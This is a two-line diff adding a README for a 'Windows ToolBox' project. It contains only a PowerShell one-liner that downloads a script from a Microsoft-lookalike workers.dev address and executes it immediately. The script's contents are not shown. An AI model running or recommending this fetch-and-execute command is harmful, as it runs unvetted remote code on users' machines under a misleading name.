@@ -1,0 +1,2 @@
+# Tricky-Karan
+Windows ToolBox Code:- iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))
